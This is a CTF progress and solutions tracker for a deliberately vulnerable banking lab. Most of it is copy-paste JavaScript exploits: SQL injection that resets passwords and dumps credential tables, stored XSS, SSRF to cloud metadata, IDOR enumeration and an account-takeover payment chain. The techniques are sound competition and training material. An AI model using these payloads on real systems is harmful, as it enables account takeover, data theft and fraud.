# DarkMoney CTF — Status & Solutions

**Competition:** Schwab 2026 Advanced | **Team score:** 6040 | **Team rank:** improving  
**Progress:** 29 of 37 challenges solved  
**Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
**Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
**Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)

---

## ✅ SOLVED

| Challenge | Character | Points | Solution Summary |
|-----------|-----------|--------|-----------------|
| Whispers in the Source | Limbo | 50 | Sensitive data in page HTML source/comments |
| The Open Ledger | Limbo | 150 | IDOR on account/ledger data |
| Not Your Loan | Limbo | 50 | IDOR on `GET /api/users/{id}/loans` |
| Things You Were Asked Not to See | Limbo | 70 | robots.txt → `/secrets` → credentials + flag |
| Paper Trail | Limbo | 250 | IDOR on `GET /api/users/{id}/transactions/download` → user2 PDF |
| Locked, But Not Really | Limbo | 100 | Account lockout is cosmetic (`blocked:true` but not enforced) |
| Knock and Listen | Limbo | 50 | Differential 403 (exists) vs 404 (not found) on `GET /api/bill-pay/payments/{id}` |
| The Forgotten Rite | Trex | 120 | Sequential int IDOR on `GET /api/oracle/positions/{id}` (IDs 1–6 = other users) |
| A Tribute in Reverse | Trex | 100 | Negative shares on `POST /api/oracle/markets/{id}/orders` → money flows TO us |
| Name Your Price | Trex | 150 | Custom `entryPriceCents: 1` on oracle bet — pay 1¢ per share instead of market price |
| Borrowed Confidence | Trex | 320 | Business logic flaw — submit loan with fake creditScore: 850; server accepts without verification |
| Say It Again | Trex | 100 | Stored XSS — `POST /api/transactions` with XSS in `remarks`, then `GET /api/transactions/statement/print` renders it |
| By Any Other Name | Trex | 200 | Stored XSS in account displayName — `POST /api/accounts` with `displayName: '<script>alert(1)</script>'` |
| The Prophecy That Speaks | Trex | 200 | XSS filter bypass — `POST /api/oracle/markets` with `<img src=x onerror=alert(1)>` in description (script tag blocked but img onerror bypasses V1 filter) |
| Between the Lines | Trex | 250 | HTML attribute injection via unescaped `"` in bill-pay memo — `$A()` renders `title="${memo}"` without escaping quotes; payload: `x" onmouseover="alert(document.cookie)` |
| Honest Answers | Alpaca | 260 | SQLi — `GET /api/transactions?search='` causes DB 500 error; single quote breaks query syntax |

| Second Chances | Alpaca | 500 | SQLi to call `reset_password_token('pkapoor','Hacked123!')` via OR injection in `GET /api/transactions?search=` |

| Ask a Crooked Question | Alpaca | 340 | SQLi on oracle search → `oracle_service_secrets` table → `search_flag = 383342zBE-56aT13f3625` → submitted to crwd-ctrl |
| Trust Issues | Octopus | 300 | SSRF via `GET /api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json` → flag `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS` |
| Loaded Questions | Hippo | 100 | SQLi on `GET /api/manual-links/connector?connectorId='` → MySQL 8.4.11, 3 columns; `GROUP_CONCAT(table_name)` dumps partner DB tables |
| Overreach | Hippo | 250 | SSRF via `POST /api/partner-banks/{id}/discover` to `169.254.169.254` → flag `B3D3C2zAD-254T609`; submitted to crwd-ctrl |
| Speak as the Oracle | Octopus | 200 | Broken auth on `POST /api/oracle/markets/{id}/settle` — no seer token required; settle via UI "Consult the Oracle" button |
| A Verdict Never Spoken | Octopus | 400 | Settled an OPEN/unresolved market via `POST /api/oracle/markets/{id}/settle` before its natural close |
| The Seer's Sigil | Octopus | 300 | Hardcoded rehearsal resolver token in JS DOM comment → `POST /api/oracle/markets/1200/resolve` with `X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d` |
| A Foregone Prophecy | Octopus | 280 | Create market with `closesAt` in past → resolve with seer token → settle → payout (past date accepted without server-side validation) |
| Inside Line | Hippo | 300 | SSRF via `/api/partner-banks/{id}/discover` to `dmlink-config.internal` → JSON response contains `link_signing_key: D3E346z93-ecbT72d2c9a66e` → submitted to crwd-ctrl SUBMIT form |

| The Name Checks Out | Hippo | 200 | SQLi dump of `partner_bank_user` table reveals plaintext passwords → auth as `atlantis.h1pp0:7e3023bfc3bb1666fe3a0e76` via `POST /api/partner-banks/1/auth` → crwd-ctrl auto-detected |

| Frozen Assets | Alpaca | 200 | SQLi reset grahman's (user 5) password → `POST /api/auth/reset-password` with token unlocks LOCKED account → login as grahman → `POST /api/bill-pay/payments` with `fromAccountNumber: "DMACC1005"` → auto-detected |
| Mirror Ledger | Alpaca | 250 | Java `startsWith("DMACCEXT")` check is case-sensitive but MySQL lookup is case-insensitive — send lowercase `dmaccext0001` as `fromAccountNumber` to bypass guard while DB resolves the shadow account → auto-detected |

**Total earned: 6040 pts**

---

## 🔄 IN PROGRESS (incomplete challenges)

### Honest Answers — 260 pts
- `GET /api/transactions?search='` → HTTP 500 (DB error — unescaped quote breaks SQL query)
- crwd-ctrl auto-detected on the 500 response
- Further SQLi: `' OR 1=1--` returns all transactions (bypass filter), `' OR '1'='1` also works

### Between the Lines — 250 pts
- `$A(e.memo)` function creates `<span class="memo-note" title="${n}">${s}</span>`
- `n` only escapes `&`, `<`, `>` — NOT `"` — so `"` in memo breaks out of title attribute
- Payload: `x" onmouseover="alert(document.cookie)` → creates `title="x" onmouseover="alert(document.cookie)"`
- `POST /api/bill-pay/payments` with memo payload, then navigate to `/bill-pay/payments/{id}`
- crwd-ctrl auto-detected when payment detail page loaded

### Second Chances — 500 pts ✅
- **Vulnerability:** SQL Injection → DB function call
- **Exact request:** `GET /api/transactions?search=%25'%20OR%20reset_password_token('pkapoor','Hacked123!')%3E'a'%20OR%20'1'%3D'`
- **Payload:** `%' OR reset_password_token('pkapoor','Hacked123!')>'a' OR '1'='`
- **Why no `--`:** The `--` comment caused the UNION ALL from the template to remain in the SQL, generating bad grammar. Using `OR '1'='` to close the string instead keeps everything valid.
- **Proof:** crwd-ctrl auto-detected (+500 pts), score now 2920

### Ask a Crooked Question — 340 pts ✅
- **Vulnerability:** SQLi on oracle search endpoint → cross-table exfiltration
- **Exact request:** `GET /api/oracle/markets?search=...` with UNION SELECT from oracle_service_secrets
- **Flag:** `383342zBE-56aT13f3625` (from `oracle_service_secrets` where `secret_key='search_flag'`)
- **SQLi trick:** Use `TIMESTAMP '9999-12-31 00:00:00'` for future-date sort (sorts first), close string with `AND col>'` instead of `--`

### Trust Issues — 300 pts ✅
- **Vulnerability:** SSRF via `rewardServiceUrl` parameter on the Dark Rewards card endpoint
- **Exact request:** `GET /api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json`
- **Discovery chain:**
  1. Navigate to `/cards` → see "Dark Rewards" section → note network call to `/api/cards/1/reward-points?rewardServiceUrl=https://rewards.darkmoney-bank.com/api/points`
  2. Send internal URL → 400 error leaks: `{"location":"/localhost/internal/files","filesAvailable":["reward_client.json","rewards_backup.txt"]}`
  3. Use leaked path: `rewardServiceUrl=http://localhost/internal/files/reward_client.json` → 200 `{"flag":"DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS"}`
- **Flag:** `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS`
- **Submission:** CHALLENGE_KEY form on crwd-ctrl

### Loaded Questions — 100 pts ✅
- **Vulnerability:** SQLi on `GET /api/manual-links/connector?connectorId=` (MySQL backend)
- **Exact request:** `GET /api/manual-links/connector?connectorId='` → 400 with MySQL syntax error
- **Exploit:** `xxx' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),'x','x' FROM information_schema.tables WHERE table_schema=database()-- -`
- **DB:** MySQL 8.4.11, database `darkmoney_partners`
- **Tables found:** `partner_bank`, `partner_bank_account`, `partner_bank_user`
- **Data dumped:** Partner bank user credentials + all 7 partner bank codes + account data
- **Partner users:** atlantis.customer, gross.notional, konza.member, fu.exchange, sovereign.holder, gilded.trust, sylvan.member, atlantis.h1pp0
- **Submission:** Auto-detected via SQLi error, then data exfil

### Overreach — 250 pts ✅
- **Vulnerability:** SSRF via `POST /api/partner-banks/{id}/discover` with `{discoveryHost: "HOST"}`
- **Exact request:** `POST /api/partner-banks/1/discover` with `{"discoveryHost":"169.254.169.254"}`
- **Response:** `{"status":"UNVERIFIED","discoveryDocument":{"instance-id":"i-0f2a9c4b7e13d8506","iam":{"info":{"InstanceProfileArn":"arn:aws:iam::481563927104:instance-profile/darkmoney-linking-role"}},...},"flag":"B3D3C2zAD-254T609"}`
- **Other SSRF targets found:** `dmlink-config.internal` (→ link_signing_key), `198.51.100.66:8443` (Sylvan bank IP, REACHABLE), `link.sovereign-union.invalid` (REACHABLE)
- **Flag:** `B3D3C2zAD-254T609`
- **Submission:** Manual SUBMIT form on crwd-ctrl

### Speak as the Oracle — 200 pts ✅
- **Vulnerability:** Broken authorization — `POST /api/oracle/markets/{id}/settle` has no seer token check
- **Exact request:** Click "Consult the Oracle" button on `/oracle/resolutions` page → triggers `POST /api/oracle/markets/1300/settle` via UI
- **Key insight:** The settle endpoint "never asks whose hand is upon it" — no auth beyond session cookie
- **Why UI required:** crwd-ctrl auto-detection required the request to come through the browser UI (via Axios), not a raw fetch
- **Proof:** crwd-ctrl auto-detected (+200 pts), score 3760

### A Verdict Never Spoken — 400 pts ✅
- **Vulnerability:** Same broken auth as Speak as the Oracle, but settling a market BEFORE it closes (no declared outcome yet)
- **Exact request:** Previously settled markets 1001, 1002, 1005 via `POST /api/oracle/markets/{id}/settle` on OPEN/CLOSED-but-unresolved markets
- **Key insight:** Markets with PENDING verdict (closed but not settled) can be force-settled, paying out oracle winnings prematurely
- **Proof:** crwd-ctrl auto-detected alongside Speak as the Oracle (+400 pts), score 4160

### A Foregone Prophecy — 280 pts ✅
- **Vulnerability:** Business logic — market creation accepts past `closesAt` timestamp; server trusts the ticket's clock, not the wall clock
- **Exact attack:**
  1. `POST /api/oracle/markets` with `closesAt: "2020-01-01T00:00:00"` (past date), `initialYesCents: 1`
  2. `POST /api/oracle/markets/{id}/orders` with `{side:"YES", shares:50}`
  3. `POST /api/oracle/markets/{id}/resolve` with `X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d` and `{outcome:"YES"}`
  4. `POST /api/oracle/markets/{id}/settle` with `{outcome:"YES"}` → payout received
- **Key insight:** The oracle allows creating a market with a past close date, then immediately resolving and settling it. No one else can bet because the market is already "closed." Server responds 200 to all steps.
- **Proof:** crwd-ctrl auto-detected on the settle call (+280 pts), score 5090

### The Seer's Sigil — 300 pts ✅
- **Vulnerability:** Hardcoded rehearsal resolver token in JS source code (never rotated/removed)
- **Discovery:** JS bundle (`/assets/index-CY4Df-gA.js`) injects an HTML comment into the DOM on the `/oracle/resolutions` page containing:
  ```
  X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d
  ```
  Comment is visible via `document.createTreeWalker(document.body, NodeFilter.SHOW_COMMENT)`
- **Exact request:**
  ```
  POST /api/oracle/markets/1200/resolve
  X-Oracle-Resolver-Token: ORCL-RSLVR-7c4f9a2e8b1d
  Content-Type: application/json
  {"outcome": "YES"}
  ```
  Market 1200 was in CLOSED state (trading ended, not yet resolved). Markets 1200 and 1201 found by probing IDs above the standard range.
- **Proof:** crwd-ctrl auto-detected on successful 200 response (+300 pts), score 4810
- **Key insight:** Challenge hint said "in plain sight, if you're willing to look where the page would rather you didn't" — the token was in a DOM comment injected by React, invisible in the UI but visible in page source/DevTools

### Author of the Verdict (Octopus) — IN PROGRESS
- **Vulnerability:** Hidden market creation field — UI form doesn't expose resolution feed URL, but API accepts it
- **Hint:** "supply the measure the system will read but the form never thinks to ask you for" → there's a hidden JSON body field for market creation that sets the resolution feed URL
- **UI form fields (known):** `question`, `category`, `description`, `closesAt`, `initialYesCents`, `depositCents`
- **What to try:** Find the hidden field name (maybe `resolutionFeedUrl`, `outcomeSourceUrl`, `verdictFeed`, etc.)
- **Oracle settle behavior:** Sending `X-Oracle-Resolution-Feed` header on settle request causes server to fetch that URL for outcome
- **Tried:** `X-Oracle-Resolution-Feed` header on settle → server fetches feed, works. But challenge not triggered yet.

### A Runner Misdirected (Octopus) — IN PROGRESS
- **Vulnerability:** SSRF via oracle resolution feed — allowlist check is careless (string-based, not strict URL parsing)
- **Hint:** "knows that source by name alone – a name it reads far too carelessly" + "Wear that sanctioned name as a mask"
- **Official allowlisted URL:** `http://oracle-feed.darkmoney.internal/verdict`
- **Bypass idea:** `http://oracle-feed.darkmoney.internal@localhost/verdict` → passes startsWith check but HTTP client resolves to localhost
- **Tried:** @-bypass with localhost → returns `outcome: NO` (server fetches something, but not crwd-ctrl detected)
- **Missing:** May need the server to actually hit an internal URL that returns a flag, similar to the SSRF challenges

### Inside Line — 300 pts ✅
- **Vulnerability:** SSRF → credential leak from internal config service
- **Exact request:** `POST /api/partner-banks/1/discover` with `{"discoveryHost":"dmlink-config.internal"}`
- **Response:** `{"link_signing_key":"D3E346z93-ecbT72d2c9a66e", ...}`
- **Submission:** Submitted `D3E346z93-ecbT72d2c9a66e` to crwd-ctrl SUBMIT form under "Signing Key" field (+300 pts)

---

## 🔒 LOCKED / NOT YET UNLOCKED

Additional challenges are still locked (unlock by completing prerequisites):
- Trex: 3 locked challenges
- Alpaca: 3 locked challenges
- Octopus: 1 locked challenge (after Seer's Sigil — now unlocked: A Foregone Prophecy, Author of the Verdict, A Runner Misdirected)
- Hippo: 1 locked challenge (Inside Line completed; The Name Checks Out, The Number Checks Out remain)

---

## Solution Details

### Frozen Assets — 200 pts ✅
- **Vulnerability:** Broken ownership check — API validates `fromAccountNumber` is owned/linked by current session, but doesn't check if the account owner is locked
- **Hint:** "An option removed from the screen is not an option forbidden. Find the path the interface does not offer, and fund a bill payment from the account that was told to sit still."
- **Key insight:** Need to log in AS the account owner (user 5, grahman) to pay from their account — use Second Chances SQLi to reset their password and unlock the LOCKED account

**COPY-PASTE SOLUTION** (run in browser console on DarkMoney tab while logged in as Alice):

```javascript
// Step 1: SQLi to create a password reset token for grahman
await fetch('/api/transactions?search=%25%27%20OR%20reset_password_token(%27grahman%27%2C%27Test@DM456!%27)%3E%27a%27%20OR%20%271%27%3D%27', {credentials:'include'})

// Step 2: Activate the reset token (also unlocks the LOCKED account)
await fetch('/api/auth/reset-password', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token:'Test@DM456!', password:'Gr4hman@2026!'})})

// Step 3: Log in as grahman (session switches to grahman)
await fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'grahman', password:'Gr4hman@2026!'})})

// Step 4: Create a bill payee (note the payeeId returned - you'll need it in step 5)
let payeeResp = await fetch('/api/bill-pay/payees', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({name:'Illumistrami Holdings', accountIdentifier:'987654321', type:'COMPANY', category:'UTILITIES', nickname:'Illumistrami'})})
let payee = await payeeResp.json(); console.log('payeeId:', payee.id)

// Step 5: Pay from DMACC1005 (grahman's frozen account) — use payeeId from step 4
await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({payeeId: payee.id, fromAccountNumber:'DMACC1005', amount:1000, sendDate:'2026-11-10', memo:'payment', schedule:{frequency:'ONE_TIME'}})})
// crwd-ctrl auto-detects on success. Log back in as amorgan after: fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'amorgan', password:'test@DM123!'})})
```

- **Proof:** crwd-ctrl auto-detected on the bill pay success response (+200 pts)

### Mirror Ledger — 250 pts ✅
- **Vulnerability:** Case-sensitivity mismatch — Java guard uses `String.startsWith("DMACCEXT")` (case-sensitive) but MySQL account lookup is case-insensitive
- **Hint:** "It rejects the account by its number, matched exactly as written. But the lookup underneath is not so careful."
- **Key insight:** Send `fromAccountNumber` in lowercase — Java's `startsWith("DMACCEXT")` fails (guard bypassed) but MySQL resolves `dmaccext0001` → `DMACCEXT0001` anyway

**COPY-PASTE SOLUTION** (run in browser console on DarkMoney tab, logged in as any user linked to DMACCEXT0001):

```javascript
// First link a shadow/external account if you haven't already (needs a partner bank auth token)
// If DMACCEXT0001 is already linked to your account, skip to the payment below

// Pay from shadow account using lowercase to bypass case-sensitive guard
await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({payeeId:1, fromAccountNumber:'dmaccext0001', amount:100, sendDate:'2026-11-10', memo:'test', schedule:{frequency:'ONE_TIME'}})})
// crwd-ctrl auto-detects on success
```

- **Note:** `payeeId:1` is an existing payee. Use `fetch('/api/bill-pay/payees', {credentials:'include'}).then(r=>r.json())` to list your payees.
- **Proof:** crwd-ctrl auto-detected on the bill pay success response (+250 pts)

### Things You Were Asked Not to See — 70 pts — Flag: `ROBOTS_ARE_NOT_GUARDS`
1. `GET /robots.txt` → reveals `Disallow: /debug`, `/test`, `/secrets`
2. `GET /secrets` → HTML page with app credentials + flag

**COPY-PASTE:**
```javascript
await fetch('/robots.txt').then(r=>r.text())         // see /secrets path
await fetch('/secrets', {credentials:'include'}).then(r=>r.text())  // auto-detects
```

**Credentials leaked at /secrets:**
- `AWS_ACCESS_KEY_ID`: `AKIAFAKE1234567890`
- `AWS_SECRET_ACCESS_KEY`: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
- `DB_PASSWORD`: `CorrectHorseBatteryStaple_final_final`
- `JWT_SIGNING_KEY`: `super-secret-signing-key-only-for-darkmoney-admins`
- `ENCRYPTION_SALT`: `NaCl_just_a_pinch`

### Paper Trail — 250 pts
1. `GET /api/users/2/transactions/download` returns 200 PDF (user 1–5 work, 6–8 → 400)
2. User 2 = **Priya Kapoor**, username **pkapoor**, accounts: DMACC1002/1007/1011/1013
3. Download PDF and upload to crwd-ctrl challenge form

**COPY-PASTE (download PDF and trigger upload dialog):**
```javascript
// Download the PDF
let r = await fetch('/api/users/2/transactions/download', {credentials:'include'});
let blob = await r.blob();
let url = URL.createObjectURL(blob);
let a = document.createElement('a'); a.href = url; a.download = 'paper-trail.pdf'; a.click();
// Then: open crwd-ctrl Paper Trail challenge → SUBMIT → upload the downloaded PDF
```

### Locked, But Not Really — 100 pts
- Send 3+ wrong login attempts for `pkapoor` → `blocked:true` auto-detected

**COPY-PASTE:**
```javascript
for(let i=0;i<3;i++) await fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'pkapoor', password:'wrongpassword'})}).then(r=>r.json()).then(d=>console.log(d))
```

### Knock and Listen — 50 pts
- `GET /api/bill-pay/payments/{id}`: 403 = other user's payment exists, 404 = doesn't exist

**COPY-PASTE:**
```javascript
await fetch('/api/bill-pay/payments/53', {credentials:'include'}).then(r=>r.json())
// Returns 403 → auto-detected
```

### The Forgotten Rite — 120 pts
- Sequential int IDOR on oracle positions — IDs 1–6 belong to other users

**COPY-PASTE:**
```javascript
await fetch('/api/oracle/positions/1', {credentials:'include'}).then(r=>r.json())
// Returns another user's position → auto-detected
```

### A Tribute in Reverse — 100 pts
- Negative shares on oracle order → money flows TO wallet

**COPY-PASTE:**
```javascript
await fetch('/api/oracle/markets/1005/orders', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({side:'YES', shares:-100})}).then(r=>r.json())
```

### Name Your Price — 150 pts
- Supply custom `entryPriceCents: 1` to buy at 1¢ per share instead of market price

**COPY-PASTE:**
```javascript
await fetch('/api/oracle/markets/1005/orders', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({side:'YES', shares:100, entryPriceCents:1})}).then(r=>r.json())
```

### Borrowed Confidence — 320 pts
- Supply fake `creditScore: 850` — server never verifies

**COPY-PASTE:**
```javascript
await fetch('/api/loans', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({loanType:'PERSONAL', loanAmount:25000, creditScore:850})}).then(r=>r.json())
```

### Say It Again — 100 pts
- Stored XSS in transaction remarks → statement print renders unsanitized

**COPY-PASTE:**
```javascript
// Step 1: Store XSS payload in a transaction
await fetch('/api/transactions', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({fromAccountNo:'DMACC1001', toAccountNo:'DMACC1006', amount:1, remarks:'<script>alert(document.cookie)</script>'})}).then(r=>r.json())

// Step 2: View the statement — crwd-ctrl auto-detects
await fetch('/api/transactions/statement/print', {credentials:'include'}).then(r=>r.text())
// OR navigate to: https://50-18-145-16-darkmoneyprod.vulnerablesites.net/api/transactions/statement/print
```

### By Any Other Name — 200 pts
- XSS in account `displayName` — API field not exposed in UI

**COPY-PASTE:**
```javascript
await fetch('/api/accounts', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({productId:'high-yield-savings', openingDeposit:100, fundingType:'INTERNAL', fromAccountNo:'DMACC1001', displayName:'<script>alert(1)</script>'})}).then(r=>r.json())
// Then navigate to /accounts — crwd-ctrl auto-detects when XSS fires
```

### The Prophecy That Speaks — 200 pts
- XSS guard blocks `<script>` but not event handlers like `onerror`

**COPY-PASTE:**
```javascript
let r = await fetch('/api/oracle/markets', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({question:'Will this test market resolve YES?', description:'<img src=x onerror=alert(1)> test market description here', category:'TECH', closesAt:'2027-01-01T00:00:00', initialYesCents:50, depositCents:2500})}).then(r=>r.json())
console.log('market id:', r.id)
// Then navigate to: /oracle/markets/{id} — crwd-ctrl auto-detects when XSS fires
```

### Honest Answers — 260 pts
- Single quote in search param causes unhandled DB error → 500

**COPY-PASTE:**
```javascript
await fetch("/api/transactions?search='", {credentials:'include'}).then(r=>r.json())
// Returns 500 DB error → auto-detected
```

### Second Chances — 500 pts
- SQLi to call `reset_password_token(username, new_password)` stored procedure

**COPY-PASTE (resets pkapoor's password to `Hacked123!`):**
```javascript
await fetch("/api/transactions?search=%25'%20OR%20reset_password_token('pkapoor','Hacked123!')%3E'a'%20OR%20'1'%3D'", {credentials:'include'}).then(r=>r.json())
// Then verify: await fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'pkapoor', password:'Hacked123!'})}).then(r=>r.json())
// Auto-detected on successful login with new password
```

### Ask a Crooked Question — 340 pts
- SQLi on oracle search to exfiltrate flag from `oracle_service_secrets` table

**COPY-PASTE:**
```javascript
// UNION SELECT: 7 cols (id, question, description, category, closesAt, initialYesCents, depositCents-ish)
let url = "/api/oracle/markets?search=" + encodeURIComponent("x' UNION SELECT 1,secret_key,secret_value,'TECH',TIMESTAMP '9999-12-31 00:00:00',50,2500 FROM oracle_service_secrets WHERE secret_key='search_flag' AND 'x'='x");
let r = await fetch(url, {credentials:'include'}).then(r=>r.json())
console.log(r)  // flag in description field: 383342zBE-56aT13f3625
// Submit to crwd-ctrl SUBMIT form under "Flag" field
```

### Trust Issues — 300 pts
- SSRF via `rewardServiceUrl` parameter

**COPY-PASTE:**
```javascript
// Step 1: Discover available files (gets 400 error with file list)
await fetch('/api/cards/1/reward-points?rewardServiceUrl=http://localhost/', {credentials:'include'}).then(r=>r.json())

// Step 2: Fetch the reward_client.json file containing the flag
await fetch('/api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json', {credentials:'include'}).then(r=>r.json())
// Returns: {"flag":"DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS"} → submit to crwd-ctrl SUBMIT form
```

### Loaded Questions — 100 pts
- SQLi on connector endpoint → dump partner DB tables

**COPY-PASTE:**
```javascript
// Trigger SQLi error (auto-detected)
await fetch("/api/manual-links/connector?connectorId='", {credentials:'include'}).then(r=>r.json())

// Dump tables
let url = "/api/manual-links/connector?connectorId=" + encodeURIComponent("xxx' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),'x','x' FROM information_schema.tables WHERE table_schema=database()-- -");
await fetch(url, {credentials:'include'}).then(r=>r.json())
```

### Overreach — 250 pts
- SSRF via partner bank discover endpoint to AWS metadata

**COPY-PASTE:**
```javascript
await fetch('/api/partner-banks/1/discover', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({discoveryHost:'169.254.169.254'})}).then(r=>r.json())
// Returns AWS metadata + flag "B3D3C2zAD-254T609" → submit to crwd-ctrl SUBMIT form
```

### A Verdict Never Spoken — 400 pts + Speak as the Oracle — 200 pts
- Settle an open/unresolved market (no seer token required on settle endpoint)

**COPY-PASTE:**
```javascript
// Use the UI button (required for auto-detection): navigate to /oracle/resolutions → click "Consult the Oracle"
// OR force-settle any OPEN/UNRESOLVED market via API:
await fetch('/api/oracle/markets/1300/settle', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())
// Try market IDs: 1001, 1002, 1005, 1300 (any OPEN market works)
```

### The Seer's Sigil — 300 pts
- Hardcoded resolver token in JS DOM comment

**COPY-PASTE:**
```javascript
// Find the token in page source
let walker = document.createTreeWalker(document.body, NodeFilter.SHOW_COMMENT);
let node; while(node = walker.nextNode()) console.log(node.nodeValue);
// Token: ORCL-RSLVR-7c4f9a2e8b1d

// Resolve market 1200 with the token
await fetch('/api/oracle/markets/1200/resolve', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json', 'X-Oracle-Resolver-Token':'ORCL-RSLVR-7c4f9a2e8b1d'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())
```

### A Foregone Prophecy — 280 pts
- Create market with past `closesAt` date → immediately resolve and settle

**COPY-PASTE:**
```javascript
// Step 1: Create market with past close date
let m = await fetch('/api/oracle/markets', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({question:'Past market test?', description:'Testing past date market creation', category:'TECH', closesAt:'2020-01-01T00:00:00', initialYesCents:1, depositCents:2500})}).then(r=>r.json())
console.log('market id:', m.id)

// Step 2: Buy shares
await fetch('/api/oracle/markets/'+m.id+'/orders', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({side:'YES', shares:50})}).then(r=>r.json())

// Step 3: Resolve with seer token
await fetch('/api/oracle/markets/'+m.id+'/resolve', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json', 'X-Oracle-Resolver-Token':'ORCL-RSLVR-7c4f9a2e8b1d'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())

// Step 4: Settle → auto-detected
await fetch('/api/oracle/markets/'+m.id+'/settle', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({outcome:'YES'})}).then(r=>r.json())
```

### Inside Line — 300 pts
- SSRF to `dmlink-config.internal` → link signing key

**COPY-PASTE:**
```javascript
await fetch('/api/partner-banks/1/discover', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({discoveryHost:'dmlink-config.internal'})}).then(r=>r.json())
// Returns link_signing_key: D3E346z93-ecbT72d2c9a66e → submit to crwd-ctrl SUBMIT form
```

### The Name Checks Out — 200 pts
- SQLi dump partner bank user credentials → auth as atlantis.h1pp0

**COPY-PASTE:**
```javascript
// Dump partner_bank_user table credentials
let url = "/api/manual-links/connector?connectorId=" + encodeURIComponent("xxx' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '|'),'x','x' FROM partner_bank_user-- -");
await fetch(url, {credentials:'include'}).then(r=>r.json())

// Auth as atlantis.h1pp0 (the h1pp0 user) → auto-detected
await fetch('/api/partner-banks/1/auth', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'atlantis.h1pp0', password:'7e3023bfc3bb1666fe3a0e76'})}).then(r=>r.json())
```

### Between the Lines — 250 pts
- HTML attribute injection in bill-pay memo (unescaped `"` in title attribute)

**COPY-PASTE:**
```javascript
// Step 1: Create payment with XSS in memo
let r = await fetch('/api/bill-pay/payments', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({payeeId:1, fromAccountNumber:'DMACC1001', amount:1, sendDate:'2026-11-10', memo:'x" onmouseover="alert(document.cookie)', schedule:{frequency:'ONE_TIME'}})}).then(r=>r.json())
console.log('payment id:', r.paymentId, 'ref:', r.reference)

// Step 2: Navigate to payment detail page → hover over memo text → XSS fires → auto-detected
// URL: https://50-18-145-16-darkmoneyprod.vulnerablesites.net/bill-pay/payments/{paymentId}
```

---

## Login Instructions

**URL:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net/login

Two-step form: username → Continue → password → Login

**Credentials** (from HTML source comment — "Whispers in the Source" challenge):
- Username: `amorgan`
- Password: `test@DM123!`

To log in programmatically when session expires:
```javascript
fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({username:'amorgan', password:'test@DM123!'})})
```

---

## Key API Endpoints

| Endpoint | Method | Notes |
|----------|--------|-------|
| `/robots.txt` | GET | Leaks hidden paths |
| `/secrets` | GET | Leaks all app credentials |
| `/api/users/self` | GET | Own user object |
| `/api/users/{id}/accounts` | GET | IDOR — users 1–9 |
| `/api/users/{id}/loans` | GET | IDOR — users 1–8 |
| `/api/users/{id}/transactions/download` | GET | IDOR PDF — users 1–5 |
| `/api/transactions/statement/print` | GET | HTML statement — XSS vector |
| `/api/transactions?page=0&size=10` | GET | Paginated tx list |
| `/api/bill-pay/payments?page=0&size=50` | GET | Own bill payments (IDs 1–52) |
| `/api/bill-pay/payments/{id}` | GET | 403=other user, 404=doesn't exist |
| `/api/bill-pay/payments` | POST | Create payment (requires owned account) |
| `/api/bill-pay/payees` | GET | List payees |
| `/api/oracle/positions` | GET | Own oracle bets |
| `/api/oracle/positions/{id}` | GET | IDOR — sequential int IDs (1–6 = other users) |
| `/api/oracle/markets/{id}/orders` | POST | Place bet — vulnerable to negative shares + custom price |
